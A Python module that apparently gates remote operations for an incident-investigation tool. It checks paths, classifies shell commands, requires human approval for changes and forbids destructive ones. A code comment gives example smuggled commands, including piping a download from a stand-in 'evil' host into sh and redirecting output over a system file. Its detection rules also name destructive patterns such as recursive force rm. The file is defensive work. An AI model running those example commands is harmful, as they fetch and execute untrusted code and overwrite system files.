"""Policy gate that must run before an adapter can contact a remote target."""

from __future__ import annotations

import re
import shlex
from collections.abc import Mapping
from pathlib import PurePosixPath
from urllib.parse import urlsplit

from pydantic import BaseModel, ConfigDict

from incidentlens_control_plane.project_registry.types import ServiceRegistration
from incidentlens_control_plane.remote_ops.transport import FileMetadata, RemoteTransport
from incidentlens_control_plane.remote_ops.types import (
    READ_ONLY_OPERATIONS,
    ContainerScope,
    HostScope,
    OperationKind,
    OperationRisk,
    PolicyDecision,
    RemoteAction,
    RemoteScope,
    ShellRequest,
    TargetProfile,
)


class RemotePathDenied(Exception):
    """Raised when a remote path is outside the allowed scope."""


class RemotePathPolicy:
    """Authorize individual remote file paths against a service's allowed roots.

    Uses lexical containment checks (``PurePosixPath.is_relative_to``) rather
    than string-prefix matching to prevent prefix-collision and parent-traversal
    attacks.
    """

    def __init__(self, registration: ServiceRegistration) -> None:
        self._host_roots = registration.allowed_host_paths
        self._container_roots = registration.allowed_container_paths
        self._container_names = frozenset(registration.container_names)

    async def authorize(
        self,
        scope: RemoteScope,
        path: PurePosixPath,
        *,
        write: bool,  # noqa: ARG002
        transport: RemoteTransport | None = None,
    ) -> PurePosixPath:
        """Return the *canonical* (resolved) path if it falls within an allowed root.

        Raises ``RemotePathDenied`` for any of:
        - Non-absolute path
        - Path containing ``..`` components
        - Path not contained in an allowed root (lexical check)
        - Symlink detected (Phase 2 -- closes replacement races)
        - Container scope referencing an unknown container name

        Parameters
        ----------
        scope:
            The execution scope (host or container).
        path:
            The requested file path.
        write:
            Whether this is a write operation.  Currently unused but reserved
            for future parent-directory validation on new-file writes.
        transport:
            When provided, the canonical path is resolved via ``realpath()``
            and checked for symlinks.  When ``None`` only lexical checks are
            performed (container scope typically omits the transport).
        """
        # --- lexical checks (always performed) ---

        if not path.is_absolute():
            raise RemotePathDenied(f"path is not absolute: {path}")

        if ".." in path.parts:
            raise RemotePathDenied(f"path contains '..': {path}")

        # Determine the allowed roots based on scope kind.
        if isinstance(scope, ContainerScope):
            if scope.container not in self._container_names:
                raise RemotePathDenied(
                    f"unknown container: {scope.container}"
                )
            allowed_roots = self._container_roots
        elif isinstance(scope, HostScope):
            allowed_roots = self._host_roots
        else:
            raise RemotePathDenied(f"unsupported scope kind: {scope.kind}")

        # Lexical containment -- ``is_relative_to`` prevents prefix collisions.
        root = self._find_root(path, allowed_roots)
        if root is None:
            raise RemotePathDenied(
                f"path {path} is outside allowed roots {allowed_roots}"
            )

        # --- canonical checks (only when a transport is available) ---

        if transport is not None:
            canonical = await transport.realpath(path)

            if not canonical.is_relative_to(root):
                raise RemotePathDenied(
                    f"resolved path {canonical} escapes allowed root {root}"
                )

            meta: FileMetadata = await transport.lstat(canonical)
            if meta.is_symlink:
                raise RemotePathDenied(
                    f"symlink detected at {canonical}"
                )

            return canonical

        return path

    # --- helpers ---

    def contains(self, path: PurePosixPath, scope: RemoteScope) -> bool:
        """Return whether a (canonicalized) path stays within an allowed root."""
        if isinstance(scope, ContainerScope):
            roots = self._container_roots
        elif isinstance(scope, HostScope):
            roots = self._host_roots
        else:
            return False
        return any(path.is_relative_to(root) for root in roots)

    @staticmethod
    def _find_root(
        path: PurePosixPath,
        roots: tuple[PurePosixPath, ...],
    ) -> PurePosixPath | None:
        """Return the first root that lexically contains *path*, or ``None``."""
        for root in roots:
            if path.is_relative_to(root):
                return root
        return None


class RemoteOperationPolicy:
    """Allow investigation by default; require explicit controls for writes.

    This is intentionally independent of LangChain/LangGraph.  The same gate
    protects actions triggered by the dashboard, an API client, or an agent.
    """

    def __init__(self, targets: Mapping[str, TargetProfile]) -> None:
        self._targets = dict(targets)

    def evaluate(self, action: RemoteAction) -> PolicyDecision:
        target = self._targets.get(action.target_id)
        if target is None:
            return PolicyDecision(allowed=False, reason="target is not registered")
        if action.service not in target.allowed_services:
            return PolicyDecision(
                allowed=False,
                reason="service is not allowlisted for this target",
            )

        if action.operation in READ_ONLY_OPERATIONS:
            return PolicyDecision(allowed=True, reason="allowlisted read-only operation")

        if action.operation is OperationKind.PROPOSE_CHANGE:
            return PolicyDecision(
                allowed=True,
                reason="proposal may be generated but cannot modify the target",
                required_gates=("human_review",),
            )

        if action.operation is OperationKind.APPLY_CHANGE:
            if action.change_controls is None:
                return PolicyDecision(
                    allowed=False,
                    reason="a change needs backup, approval, verification, and rollback controls",
                    required_gates=(
                        "backup",
                        "human_approval",
                        "verification_plan",
                        "rollback_plan",
                    ),
                )
            return PolicyDecision(
                allowed=True,
                reason="approved reversible change; adapter must verify after execution",
                required_gates=("post_change_verification",),
            )

        return PolicyDecision(allowed=False, reason="operation is not supported")


# ---------------------------------------------------------------------------
# Shell command policy
# ---------------------------------------------------------------------------


class ShellPolicyDecision(BaseModel):
    """Machine- and UI-readable decision for shell command classification."""

    model_config = ConfigDict(extra="forbid", frozen=True)

    risk: OperationRisk
    reason: str
    approval_can_override: bool
    canonical_operation: str


# Patterns that indicate dangerous command features
_NUL_RE = re.compile(r"\x00")
_NEWLINE_RE = re.compile(r"\n")
_CMD_SUBSTITUTION_RE = re.compile(r"\$\(|`")
_EVAL_RE = re.compile(r"\beval\b")
_XARGS_RM_RE = re.compile(r"\bxargs\b.*\brm\b")
_FIND_DELETE_RE = re.compile(r"\bfind\b.*-delete")
# Shell control/redirection metacharacters.  ``&&``/``||``/``;``/``|`` chain or
# pipe commands and ``<``/``>`` redirect I/O, so a single auto-read executable
# could smuggle an arbitrary second command or write to an arbitrary path
# (``docker logs x && curl evil | sh``, ``docker inspect x > /etc/evil``).
# Matching is intentionally conservative: the character is rejected even inside
# a quoted argument, because a persistent shell would still interpret it.
_SHELL_CONTROL_RE = re.compile(r"[&|;<>]")


def has_shell_control_metacharacters(command: str) -> bool:
    """Return True when *command* contains shell chaining or redirection.

    This is the single source of truth shared by ``_parse_command`` and the
    agent tool executor, so a command can never bypass the shell approval gate
    by chaining or redirecting I/O.
    """
    return _SHELL_CONTROL_RE.search(command) is not None


def _parse_command(command: str) -> list[str] | None:
    """Parse a command string into tokens, returning None if dangerous features detected.

    Rejects:
    - NUL bytes
    - Newlines (command injection)
    - Shell control/redirection metacharacters (&&, ||, |, ;, <, >, &)
    - Malformed quoting (ValueError from shlex)
    - Command substitution ($() or backticks)
    - eval
    - xargs rm
    - find -delete
    """
    # Check for NUL bytes
    if _NUL_RE.search(command):
        return None

    # Check for newlines (command injection)
    if _NEWLINE_RE.search(command):
        return None

    # Check for shell chaining/redirection metacharacters
    if has_shell_control_metacharacters(command):
        return None

    # Check for command substitution
    if _CMD_SUBSTITUTION_RE.search(command):
        return None

    # Check for eval
    if _EVAL_RE.search(command):
        return None

    # Check for xargs rm
    if _XARGS_RM_RE.search(command):
        return None

    # Check for find -delete
    if _FIND_DELETE_RE.search(command):
        return None

    try:
        tokens = shlex.split(command)
    except ValueError:
        return None

    return tokens


def _strip_prefixes(tokens: list[str]) -> list[str]:
    """Strip leading sudo, env NAME=value, and command prefixes."""
    result = list(tokens)
    while result:
        token = result[0]
        if token == "sudo":
            result = result[1:]
        elif token == "command":
            result = result[1:]
        elif token == "env":
            # Skip env and any NAME=value pairs
            result = result[1:]
            while result and "=" in result[0]:
                result = result[1:]
        else:
            break
    return result


def _has_recursive_force_rm(tokens: list[str]) -> bool:
    """Check if command is a recursive + force rm.

    Scans *every* token so any ordering of paths and flags is caught, e.g.
    ``rm /opt/app -rf`` and ``sudo rm /opt/app --force -r``.  A sequence is
    forbidden when it contains both a recursive (``r``/``R``) and a force
    (``f``) short flag, or the matching long flags, in any positions.
    """
    stripped = _strip_prefixes(tokens)
    if not stripped:
        return False

    cmd = stripped[0]
    if cmd != "rm":
        return False

    has_recursive = False
    has_force = False
    for token in stripped[1:]:
        if token.startswith("--"):
            # Long flags: --recursive, --force (prefix match stays conservative
            # for combined or abbreviated forms).
            if token.startswith("--recursive"):
                has_recursive = True
            elif token.startswith("--force"):
                has_force = True
            continue
        if token.startswith("-") and token != "-":
            short_flags = token[1:]
            if any(f in short_flags for f in ("r", "R")):
                has_recursive = True
            if "f" in short_flags:
                has_force = True

    return has_recursive and has_force


def _is_path_authorized(
    path: str,
    service: ServiceRegistration,
) -> bool:
    """Check if a path is within allowed roots for the service."""
    try:
        pp = PurePosixPath(path)
        if not pp.is_absolute():
            return False
        if ".." in pp.parts:
            return False

        # Check against host roots
        for root in service.allowed_host_paths:
            if pp.is_relative_to(root):
                return True

        # Check against container roots
        for root in service.allowed_container_paths:
            if pp.is_relative_to(root):
                return True

        return False
    except Exception:
        return False


def _docker_logs_target(arguments: list[str]) -> str | None:
    """Return the container operand after bounded, read-only log options."""
    return _docker_read_target(
        arguments,
        options_with_values={"--since", "--tail", "--until"},
        flags={"--details", "--timestamps"},
    )


def _docker_read_target(
    arguments: list[str],
    *,
    options_with_values: set[str],
    flags: set[str],
) -> str | None:
    """Parse one target while allowing read-only options on either side."""
    index = 0
    target: str | None = None
    while index < len(arguments):
        token = arguments[index]
        if token in options_with_values:
            if index + 1 >= len(arguments):
                return None
            index += 2
            continue
        if any(token.startswith(f"{option}=") for option in options_with_values):
            index += 1
            continue
        if token in flags:
            index += 1
            continue
        if token.startswith("-"):
            return None
        if target is not None:
            return None
        target = token
        index += 1
    return target


def _docker_compose_read_subcommand(
    arguments: list[str], service: ServiceRegistration
) -> str | None:
    """Return a read-only Compose subcommand after authorized file options."""
    index = 0
    while index < len(arguments):
        token = arguments[index]
        if token in {"-f", "--file", "--project-directory"}:
            if index + 1 >= len(arguments):
                return None
            if not _is_path_authorized(arguments[index + 1], service):
                return None
            index += 2
            continue
        if token.startswith("--file=") or token.startswith("--project-directory="):
            if not _is_path_authorized(token.split("=", 1)[1], service):
                return None
            index += 1
            continue
        if token.startswith("-"):
            return None
        return token if token in {"ps", "logs", "config"} else None
    return None


def _is_read_only_find(
    arguments: list[str], service: ServiceRegistration
) -> bool:
    """Accept a small, non-mutating ``find`` grammar under registered roots."""
    index = 0
    roots: list[str] = []
    while index < len(arguments) and not arguments[index].startswith("-"):
        roots.append(arguments[index])
        index += 1
    if not roots or not all(_is_path_authorized(root, service) for root in roots):
        return False

    while index < len(arguments):
        token = arguments[index]
        if token == "-maxdepth":
            if index + 1 >= len(arguments) or not arguments[index + 1].isdigit():
                return False
            depth = int(arguments[index + 1])
            if not 0 <= depth <= 10:
                return False
            index += 2
            continue
        if token == "-mindepth":
            if index + 1 >= len(arguments) or not arguments[index + 1].isdigit():
                return False
            index += 2
            continue
        if token == "-type":
            if index + 1 >= len(arguments) or arguments[index + 1] not in {"f", "d", "l"}:
                return False
            index += 2
            continue
        if token in {"-name", "-iname", "-path"}:
            if index + 1 >= len(arguments):
                return False
            index += 2
            continue
        if token in {"-print", "-print0"}:
            index += 1
            continue
        return False
    return True


def _is_loopback_http_url(value: str, *, health_only: bool) -> bool:
    try:
        parsed = urlsplit(value)
        _ = parsed.port
    except ValueError:
        return False
    if parsed.scheme not in {"http", "https"}:
        return False
    if parsed.username or parsed.password or parsed.hostname not in {
        "localhost",
        "127.0.0.1",
        "::1",
    }:
        return False
    if parsed.query or parsed.fragment:
        return False
    if health_only:
        return parsed.path in {"/health", "/healthz"}
    return parsed.path in {"", "/"}


def _is_read_only_health_curl(arguments: list[str]) -> bool:
    index = 0
    url: str | None = None
    while index < len(arguments):
        token = arguments[index]
        if token in {"-s", "-S", "--silent", "--show-error"}:
            index += 1
            continue
        if token in {"-o", "--output"}:
            if index + 1 >= len(arguments) or arguments[index + 1] != "/dev/null":
                return False
            index += 2
            continue
        if token in {"-w", "--write-out"}:
            if index + 1 >= len(arguments) or arguments[index + 1] != "%{http_code}":
                return False
            index += 2
            continue
        if token.startswith("-") or url is not None:
            return False
        url = token
        index += 1
    return url is not None and _is_loopback_http_url(url, health_only=True)


def _is_registered_validation_script(
    executable: str,
    arguments: list[str],
    service: ServiceRegistration,
) -> bool:
    if executable not in {"python", "python3"} or len(arguments) != 5:
        return False
    script, url_flag, url, expected_flag, expected = arguments
    try:
        script_path = PurePosixPath(script)
    except ValueError:
        return False
    return (
        script_path in service.allowed_validation_scripts
        and url_flag == "--url"
        and _is_loopback_http_url(url, health_only=False)
        and expected_flag == "--expected"
        and expected in {"pre-repair", "repaired"}
    )


class CommandPolicy:
    """Conservative command classifier for shell execution.

    The policy is deliberately conservative: parsing uncertainty becomes
    APPROVAL_REQUIRED, never automatic execution.
    """

    def evaluate(
        self,
        request: ShellRequest,
        service: ServiceRegistration,
    ) -> ShellPolicyDecision:
        """Classify a shell command and return a policy decision."""
        command = request.command

        # Parse the command
        tokens = _parse_command(command)
        if tokens is None:
            return ShellPolicyDecision(
                risk=OperationRisk.FORBIDDEN,
                reason="command contains dangerous features "
                "(NUL, newlines, command substitution, eval, or malformed syntax)",
                approval_can_override=False,
                canonical_operation=command,
            )

        # Check for recursive + force rm (always forbidden)
        if _has_recursive_force_rm(tokens):
            return ShellPolicyDecision(
                risk=OperationRisk.FORBIDDEN,
                reason="recursive force rm is permanently forbidden",
                approval_can_override=False,
                canonical_operation=command,
            )

        # Strip prefixes to identify the executable
        stripped = _strip_prefixes(tokens)
        if not stripped:
            return ShellPolicyDecision(
                risk=OperationRisk.APPROVAL_REQUIRED,
                reason="empty command after stripping prefixes",
                approval_can_override=True,
                canonical_operation=command,
            )

        executable = stripped[0]

        # --- Automatic reads ---
        if executable == "pwd":
            return ShellPolicyDecision(
                risk=OperationRisk.AUTO_READ,
                reason="pwd is a safe read-only command",
                approval_can_override=True,
                canonical_operation=command,
            )

        if executable == "curl" and _is_read_only_health_curl(stripped[1:]):
            return ShellPolicyDecision(
                risk=OperationRisk.AUTO_READ,
                reason="bounded loopback health request is a safe read",
                approval_can_override=True,
                canonical_operation=command,
            )

        if _is_registered_validation_script(executable, stripped[1:], service):
            return ShellPolicyDecision(
                risk=OperationRisk.AUTO_READ,
                reason="registered loopback validation script",
                approval_can_override=True,
                canonical_operation=command,
            )

        if executable == "docker" and len(stripped) > 1:
            docker_subcmd = stripped[1]

            # docker ps is automatic
            if docker_subcmd == "ps":
                return ShellPolicyDecision(
                    risk=OperationRisk.AUTO_READ,
                    reason="docker ps is a safe read-only command",
                    approval_can_override=True,
                    canonical_operation=command,
                )

            # docker inspect is automatic for registered containers
            if docker_subcmd == "inspect" and len(stripped) > 2:
                target_container = _docker_read_target(
                    stripped[2:],
                    options_with_values={"--format", "-f", "--type"},
                    flags={"--size", "-s"},
                )
                if target_container in service.container_names:
                    return ShellPolicyDecision(
                        risk=OperationRisk.AUTO_READ,
                        reason=f"docker inspect {target_container} is a registered container",
                        approval_can_override=True,
                        canonical_operation=command,
                    )

            # docker logs is automatic for registered containers
            if docker_subcmd == "logs" and len(stripped) > 2:
                target_container = _docker_logs_target(stripped[2:])
                if target_container in service.container_names:
                    return ShellPolicyDecision(
                        risk=OperationRisk.AUTO_READ,
                        reason=f"docker logs {target_container} is a registered container",
                        approval_can_override=True,
                        canonical_operation=command,
                    )

            if docker_subcmd == "port" and len(stripped) == 3:
                target_container = stripped[2]
                if target_container in service.container_names:
                    return ShellPolicyDecision(
                        risk=OperationRisk.AUTO_READ,
                        reason=f"docker port {target_container} is a registered container",
                        approval_can_override=True,
                        canonical_operation=command,
                    )

            # docker compose ps/logs/config are automatic for registered services
            if docker_subcmd == "compose" and len(stripped) > 2:
                compose_subcmd = _docker_compose_read_subcommand(stripped[2:], service)
                if compose_subcmd is not None:
                    return ShellPolicyDecision(
                        risk=OperationRisk.AUTO_READ,
                        reason=f"docker compose {compose_subcmd} is a safe read-only command",
                        approval_can_override=True,
                        canonical_operation=command,
                    )

            # docker compose up/down need approval
            if docker_subcmd == "compose" and len(stripped) > 2:
                compose_subcmd = stripped[2]
                if compose_subcmd in ("up", "down"):
                    return ShellPolicyDecision(
                        risk=OperationRisk.APPROVAL_REQUIRED,
                        reason=f"docker compose {compose_subcmd} modifies system state",
                        approval_can_override=True,
                        canonical_operation=command,
                    )

            # docker restart/rm need approval
            if docker_subcmd in ("restart", "rm"):
                return ShellPolicyDecision(
                    risk=OperationRisk.APPROVAL_REQUIRED,
                    reason=f"docker {docker_subcmd} modifies container state",
                    approval_can_override=True,
                    canonical_operation=command,
                )

        # --- File read commands (automatic when every path is authorized) ---
        if executable in ("ls", "cat", "stat"):
            # Every non-flag argument must be an authorized absolute path.  A
            # relative argument (e.g. "../secret") cannot be authorized against
            # the registered roots, so the command is not automatic.
            if len(stripped) > 1:
                path_args = [arg for arg in stripped[1:] if not arg.startswith("-")]
                all_paths_valid = all(
                    _is_path_authorized(arg, service) for arg in path_args
                )
                if all_paths_valid:
                    return ShellPolicyDecision(
                        risk=OperationRisk.AUTO_READ,
                        reason=f"{executable} with valid paths",
                        approval_can_override=True,
                        canonical_operation=command,
                    )

        if executable == "find" and _is_read_only_find(stripped[1:], service):
            return ShellPolicyDecision(
                risk=OperationRisk.AUTO_READ,
                reason="read-only find under authorized roots",
                approval_can_override=True,
                canonical_operation=command,
            )

        # --- sed -i is forbidden (must use remote_edit) ---
        if executable == "sed" and "-i" in stripped:
            return ShellPolicyDecision(
                risk=OperationRisk.FORBIDDEN,
                reason="use remote_edit so mandatory backups cannot be bypassed",
                approval_can_override=False,
                canonical_operation=command,
            )

        # --- Package managers need approval ---
        if executable in ("apt-get", "apt", "yum", "dnf", "pip", "npm"):
            return ShellPolicyDecision(
                risk=OperationRisk.APPROVAL_REQUIRED,
                reason=f"{executable} modifies system packages",
                approval_can_override=True,
                canonical_operation=command,
            )

        # --- Unclassified commands require approval ---
        return ShellPolicyDecision(
            risk=OperationRisk.APPROVAL_REQUIRED,
            reason=f"unclassified command {executable!r} requires approval",
            approval_can_override=True,
            canonical_operation=command,
        )
